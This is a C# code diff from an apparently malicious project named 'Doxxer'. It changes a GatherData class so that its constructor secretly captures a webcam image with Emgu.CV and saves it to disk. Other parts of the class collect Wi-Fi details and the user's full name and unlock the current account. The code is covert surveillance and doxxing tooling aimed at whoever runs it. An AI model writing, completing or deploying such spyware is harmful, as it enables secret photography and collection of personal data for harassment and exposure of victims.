@@ -1,6 +1,10 @@
 ﻿using System;
 using System.Diagnostics;
 using System.DirectoryServices.AccountManagement;
+using System.Drawing;
+using System.Text.RegularExpressions;
+using Emgu.CV;
+using Emgu.CV.Structure;
 using SimpleWifi;
 
 namespace Doxxer
@@ -9,8 +13,7 @@ namespace Doxxer
     {
         public GatherData()
         {
-            GetWifi();
-            getFullName();
+            takeWebCamPicture();
         }
 
         private string GetWifi()
@@ -82,6 +85,14 @@ namespace Doxxer
         private void unlockAccount()
         {
             UserPrincipal.Current.UnlockAccount();
+        }
+        
+        private void takeWebCamPicture()
+        {
+            VideoCapture capture = new VideoCapture();
+            Bitmap image = capture.QueryFrame().ToBitmap();
+            image.Save("webcam.png");
+
         }
     }
 }
